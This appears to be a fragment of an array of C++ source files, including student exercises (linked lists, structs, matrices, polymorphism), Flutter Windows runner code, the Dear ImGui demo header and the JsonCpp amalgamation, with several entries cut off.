(hitung != NULL)\r\n    {\r\n        jumlah++;\r\n        hitung = hitung->next;\r\n    }\r\n    return jumlah;\r\n}\r\n\r\n// Tambah Tengah\r\nvoid insertTengah(int data,string kata ,int posisi)\r\n{\r\n    if (posisi < 1 || posisi > hitungList())\r\n    {\r\n        cout << \"Posisi diluar jangkauan\" << endl;\r\n    }\r\n    else if (posisi == 1)\r\n    {\r\n        cout << \"Posisi bukan posisi tengah\" << endl;\r\n    }\r\n    else\r\n    {\r\n        Node *baru, *bantu;\r\n        baru = new Node();\r\n        baru->data = data;\r\n        baru->kata = kata;\r\n        // tranversing\r\n        bantu = head;\r\n        int nomor = 1;\r\n        while (nomor < posisi - 1)\r\n        {\r\n            bantu = bantu->next;\r\n            nomor++;\r\n        }\r\n        baru->next = bantu->next;\r\n        bantu->next = baru;\r\n    }\r\n}\r\n\r\n// Hapus Depan\r\nvoid hapusDepan()\r\n{\r\n    Node *hapus;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (head->next != NULL)\r\n        {\r\n            hapus = head;\r\n            head = head->next;\r\n            delete hapus;\r\n        }\r\n        else\r\n        {\r\n            head = tail = NULL;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Hapus Belakang\r\nvoid hapusBelakang()\r\n{\r\n    Node *hapus;\r\n    Node *bantu;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (head != tail)\r\n        {\r\n            hapus = tail;\r\n            bantu = head;\r\n            while (bantu->next != tail)\r\n            {\r\n                bantu = bantu->next;\r\n            }\r\n            tail = bantu;\r\n            tail->next = NULL;\r\n            delete hapus;\r\n        }\r\n        else\r\n        {\r\n            head = tail = NULL;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Hapus Tengah\r\nvoid hapusTengah(int posisi)\r\n{\r\n    Node *hapus, *bantu, *bantu2;\r\n    if (posisi < 1 || posisi > hitungList())\r\n    {\r\n        cout << \"Posisi di luar jangkauan\" << endl;\r\n    }\r\n    else if (posisi == 1)\r\n    {\r\n        cout << \"Posisi bukan posisi tengah\" << endl;\r\n    }\r\n    else\r\n    {\r\n        int nomor = 1;\r\n        bantu = head;\r\n        while (nomor <= posisi)\r\n        {\r\n            if (nomor == posisi - 1)\r\n            {\r\n                bantu2 = bantu;\r\n            }\r\n            if (nomor == posisi)\r\n            {\r\n                hapus = bantu;\r\n            }\r\n            bantu = bantu->next;\r\n            nomor++;\r\n        }\r\n        bantu2->next = bantu;\r\n        delete hapus;\r\n    }\r\n}\r\n\r\n// Ubah Depan\r\nvoid ubahDepan(int data, string kata)\r\n{\r\n    if (isEmpty() == false)\r\n    {\r\n        head->data = data;\r\n        head->kata = kata;\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n// Ubah Tengah\r\nvoid ubahTengah(int data,string kata ,int posisi)\r\n{\r\n    Node *bantu;\r\n    if (isEmpty() == false)\r\n    {\r\n        if (posisi < 1 || posisi > hitungList())\r\n        {\r\n            cout << \"Posisi di luar jangkauan\" << endl;\r\n        }\r\n        else if (posisi == 1)\r\n        {\r\n            cout << \"Posisi bukan posisi tengah\" << endl;\r\n        }\r\n        else\r\n        {\r\n            bantu = head;\r\n            int nomor = 1;\r\n            while (nomor < posisi)\r\n            {\r\n                bantu = bantu->next;\r\n                nomor++;\r\n            }\r\n            bantu->data = data;\r\n            bantu->kata = kata;\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n\r\n// Ubah Belakang\r\nvoid ubahBelakang(int data, string kata)\r\n{\r\n    if (isEmpty() == false)\r\n    {\r\n        tail->data = data;\r\n        tail->kata = kata;\r\n    }\r\n    else\r\n    {\r\n        cout << \"List masih kosong!\" << endl;\r\n    }\r\n}\r\n// Hapus List\r\nvoid clearList()\r\n{\r\n    Node *bantu, *hapus;\r\n    b",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tstring alamat;\n\tstring umur;\n};\n\nint main() {\n\tMahasiswa mhs;\n\tcout << \"Nomor Mahasiswa : \";\n\tcin >> mhs.nim;\n\tcout << \"Nama Mahasiswa : \";\n\tcin >> mhs.nama;\n\tcout << \"Alamat Mahasiswa : \";\n\tcin >> mhs.alamat;\n\tcout << \"Umur Mahasiswa : \";\n\tcin >> mhs.umur;\n\n\tcout << endl; \n\tcout << \"\\n NIM : \"<<mhs.nim;\n\tcout << \"\\n Nama : \" << mhs.nama;\n\tcout << \"\\n Alamat : \" << mhs.alamat;\n\tcout << \"\\n Umur : \" << mhs.umur;\n\n}\n\n#include <iostream>\nusing namespace std;\n\nstruct DetailAlamat{\n\tstring desa;\n\tstring kota;\n};\n\nstruct Mahasiswa {\n\tstring nim;\n\tstring nama;\n\tDetailAlamat alamat;\n\tint umur;\n};\n\nint main() {\n\tMahasiswa mhs;\n\tcout << \"Nomor Mahasiswa : \";\n\tcin >> mhs.nim;\n\tcout << \"Nama Mahasiswa : \";\n\tcin >> mhs.nama;\n\n\tcout << \"Alamat Mahasiswa : \" << endl;\n\tcout << \"\\t Nama Desa : \";\n\tcin >> mhs.alamat.desa;\n\tcout << \"\\t Nama Kota : \";\n\tcin >> mhs.alamat.kota;\n\n\tcout << \"Umur Mahasiswa : \";\n\tcin >> mhs.umur;\n\n\tcout << endl;\n\tcout <<\"\\n Nim : \" << mhs.nim;\n\tcout << \"\\n Nama : \" << mhs.nama;\n\tcout << \"\\n Alamat : \";\n\tcout << \"\\n \\t Desa : \" << mhs.alamat.desa;\n\tcout << \"\\n \\t Kota : \" << mhs.alamat.kota;\n\tcout << \"\\n Umur : \" << mhs.umur; \n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include <iostream>\n#include <Windows.h>\n\nusing namespace std;\n\nconst int MAX_TRANSISTORS = 4; \n\nstruct Transistor {\n    string name;\n    string type; \n    float power;\n    float maxCurrent;\n    int count;\n};\n\nvoid printTransistorInfo(Transistor t) {\n    setlocale(LC_ALL, \"Ukrainian\");\n    cout << \"  Name: \" << t.name << endl;\n    cout << \"  Type: \" << t.type << endl;\n    cout << \"  Power: \" << t.power << \" \u0412\u0442\" << endl;\n    cout << \"  Maximum operating current: \" << t.maxCurrent << \" \u0410\" << endl;\n    cout << \"  Quantity: \" << t.count << endl << endl;\n}\n\nTransistor findMaxPowerTransistor(Transistor transistors[]) {\n    Transistor maxPowerTransistor = transistors[0];\n    for (int i = 1; i < MAX_TRANSISTORS; i++) {\n        if (transistors[i].power > maxPowerTransistor.power) {\n            maxPowerTransistor = transistors[i];\n        }\n    }\n    return maxPowerTransistor;\n}\n\nint main() {\n    setlocale(LC_ALL, \"Ukrainian\");\n\n    Transistor transistors[MAX_TRANSISTORS];\n\n    \n    for (int i = 0; i < MAX_TRANSISTORS; i++) {\n        cout << \"Enter information about the transistor \" << i + 1 << \":\" << endl;\n        cout << \"  : \";\n        cin >> transistors[i].name;\n        cout << \"  Type (npn/pnp): \";\n        cin >> transistors[i].type;\n        cout << \"  Power (\u0412\u0442): \";\n        cin >> transistors[i].power;\n        cout << \"  Maximum operating current (\u0410): \";\n        cin >> transistors[i].maxCurrent;\n        cout << \"  Quantity: \";\n        cin >> transistors[i].count;\n    }\n\n    \n    cout << endl << \"List of transistors:\" << endl;\n    for (int i = 0; i < MAX_TRANSISTORS; i++) {\n        printTransistorInfo(transistors[i]);\n    }\n\n    \n    Transistor maxPowerTransistor = findMaxPowerTransistor(transistors);\n\n   \n    cout << \"Transistor with maximum power:\" << endl;\n    printTransistorInfo(maxPowerTransistor);\n\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// dear imgui, v1.90.5 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read top of imgui.cpp and imgui.h for many details, documentation, comments, links.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App:",
    "\ufeff#include <iostream>\n\nusing namespace std;\n\nint main() {\n    int matrix[5][5];\n    cout << \"Please enter numbers for matrix\\n\";\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cin >> matrix[i][j];\n        }\n    }\n\n    int inverseMatrix[5][5];\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            inverseMatrix[i][j] = (matrix[j][i] != 0) ? 1 / matrix[j][i] : 0;\n        }\n    }\n\n    int minElements[5];\n    for (int i = 0; i < 5; i++) {\n        int minElement = matrix[i][0];\n        for (int j = 1; j < 5; j++) {\n            if (matrix[i][j] < minElement) {\n                minElement = matrix[i][j];\n            }\n        }\n        minElements[i] = minElement;\n    }\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = i + 1; j < 5; j++) {\n            if (minElements[i] < minElements[j]) {\n                swap(minElements[i], minElements[j]);\n            }\n        }\n    }\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cout << matrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    cout << endl;\n\n    for (int i = 0; i < 5; i++) {\n        for (int j = 0; j < 5; j++) {\n            cout << inverseMatrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n\n    cout << endl;\n\n    for (int i = 0; i < 5; i++) {\n        cout << minElements[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\n",
    "#include <iostream>\nusing namespace std;\nclass Movement\n{\npublic:\n    virtual void movement()\n    {\n        \n    }\n};\nclass Swim:public Movement\n{\n    void movement() override\n    {\n        cout << \"\u0411\u0443\u043b\u044c\u043a - \u0431\u0443\u043b\u044c\u043a\" << endl;\n    }\n};\nclass Teleport : public Movement\n{\n    void movement() override\n    {\n        int n = rand() % 100;\n        cout << \"\u043e\u043f\u0430 \u0438 \u044f \u0438\u0441\u0447\u0435\u0437, \u0430 \u043a\u0443\u0434\u0430 \u043d\u0435 \u0437\u043d\u0430\u044e\" << endl;\n        if (n % 2 == 0)\n        {\n            cout << \"\u041f\u0440\u043e\u0441\u0447\u0438\u0442\u0430\u043b\u0441\u044f \u043d\u043e \u0433\u0434\u0435...\" << endl;\n        }\n    }\n};\nclass Fly: public Movement\n{\n    void movement() override\n    {\n        cout << \"\u041d\u0443 \u0432\u0441\u0435, \u0431\u0431, \u044f \u043f\u043e\u043b\u0435\u0442\u0435\u043b\" << endl;\n    }\n};\nclass Lay :public Movement\n{\n    void movement() override\n    {\n        cout << \"\u0412\u0441\u0435, \u044f \u0441\u043f\u0430\u0442\u044c\" << endl;\n    }\n};\nclass Person\n{\npublic:\n    void move(Movement* move)\n    {\n        move->movement();\n    }\n};\nint main()\n{\n    setlocale(0, \"ru\");\n    srand(time(NULL));\n    Person person;\n    Swim swim;\n    person.move(&swim);\n    Fly fly;\n    person.move(&fly);\n    Teleport tp;\n    person.move(&tp);\n}\n",
    "/// Json-cpp amalgated source (http://jsoncpp.sourceforge.net/).\n/// It is intended to be used with #include \"json/json.h\"\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n/*\nThe JsonCpp library's source code, including accompanying documentation,\ntests and demonstration applications, are licensed under the following\nconditions...\n\nThe author (Baptiste Lepilleur) explicitly disclaims copyright in all\njurisdictions which recognize such a disclaimer. In such jurisdictions,\nthis software is released into the Public Domain.\n\nIn jurisdictions which do not recognize Public Domain property (e.g. Germany as of\n2010), this software is Copyright (c) 2007-2010 by Baptiste Lepilleur, and is\nreleased under the terms of the MIT License (see below).\n\nIn jurisdictions which recognize Public Domain property, the user of this\nsoftware may choose to accept it either as 1) Public Domain, 2) under the\nconditions of the MIT License (see below), or 3) under the terms of dual\nPublic Domain/MIT License conditions described here, as they choose.\n\nThe MIT License is about as close to Public Domain as a license can get, and is\ndescribed in clear, concise terms at:\n\n   http://en.wikipedia.org/wiki/MIT_License\n\nThe full text of the MIT License follows:\n\n========================================================================\nCopyright (c) 2007-2010 Baptiste Lepilleur\n\nPermission is hereby granted, free of charge, to any person\nobtaining a copy of this software and associated documentation\nfiles (the \"Software\"), to deal in the Software without\nrestriction, including without limitation the rights to use, copy,\nmodify, merge, publish, distribute, sublicense, and/or sell copies\nof the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be\nincluded in all copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\nNONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\nBE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\nACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\nCONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n========================================================================\n(END LICENSE TEXT)\n\nThe MIT license is compatible with both the GPL and commercial\nsoftware, affording one all of the rights of Public Domain with the\nminor nuisance of being required to keep the above copyright notice\nand license text in the source code. Note also that by accepting the\nPublic Domain \"license\" you can re-license your copy using whatever\nlicense you like.\n\n*/\n\n// //////////////////////////////////////////////////////////////////////\n// End of content of file: LICENSE\n// //////////////////////////////////////////////////////////////////////\n\n\n\n\n\n\n#include \"third_party/jsoncpp/json.h\"\n\n#ifndef JSON_IS_AMALGAMATION\n#error \"Compile with -I PATH_TO_JSON_DIRECTORY\"\n#endif\n\n\n// //////////////////////////////////////////////////////////////////////\n// Beginning of content of file: src/lib_json/json_tool.h\n// //////////////////////////////////////////////////////////////////////\n\n// Copyright 2007-2010 Baptiste Lepilleur\n// Distributed under MIT license, or public domain if desired and\n// recognized in your jurisdiction.\n// See file LICENSE for detail or copy at http://jsoncpp.sourceforge.net/LICENSE\n\n#ifndef LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n#define LIB_JSONCPP_JSON_TOOL_H_INCLUDED\n\n/* This header provides common string manipulation support, such as UTF-8,\n * portable conversion from/to string...\n *\n * It is an internal header that must not be exposed.\n */\n\nnamespace Json {\n\n/// Converts a unicode code-point to UTF-8.\nstatic inline std::string codePointToUTF8(unsigned int cp) {\n  std::string result;\n\n  // based on description from http://en.wikipedia.org/wiki/UTF-8\n\n  if (cp <= 0x7f) {\n    result.resize(1);\n    result[0] = static_cast<char>(cp);\n  } else if (cp <= 0x7FF) {\n    result.resize(2);\n    result[1] = static_cast<char>(0x80 | (0x3f & cp));\n    result[0] = static_cast<char>(0xC0 | (0x1f & (cp >> 6)));\n  } else if (cp <= 0xFFFF) {\n    result.resize(3);\n    result[2] = static_cast<char>(0x80 | (0x3f & cp));\n    result[1] = static_cast<char>(0x80 | (0x3f & (cp >> 6)));\n    result[0] = static_cast<char>(0xE0 | (0xf & (cp >> 12)));\n  } else if (cp <= 0x10FFFF) {\n    result.resize(4);\n    result[3] = static_cast<char>(0x80 | (0x3f & cp));\n    result[2] = static_cast<char>(0x80 | (0x3f & (cp >> 6)));\n    result[1] = static_cast<char>(0x80 | (0x3f & (cp >> 12)));\n    result[0] = static_cast<char>(0xF0 | (0x7 & (cp >> 18)));\n  }\n\n  return result;\n}\n\n///",
